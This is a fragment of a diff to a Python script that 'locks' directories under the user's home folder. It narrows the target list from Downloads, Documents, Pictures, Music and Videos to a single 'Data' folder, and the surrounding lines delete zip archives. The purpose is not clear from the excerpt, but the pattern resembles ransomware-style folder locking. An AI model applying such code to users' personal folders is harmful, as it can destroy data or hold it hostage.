@@ -30,7 +30,7 @@ def lock_dir(directory):
     os.remove(f"{directory}.zip")
 
 # lock the directory
-dirs_to_lock = ["Downloads", "Documents", "Pictures", "Music", "Videos"]
+dirs_to_lock = ["Data"]
 
 for dir in dirs_to_lock:
     root_dir = os.path.expanduser('~')
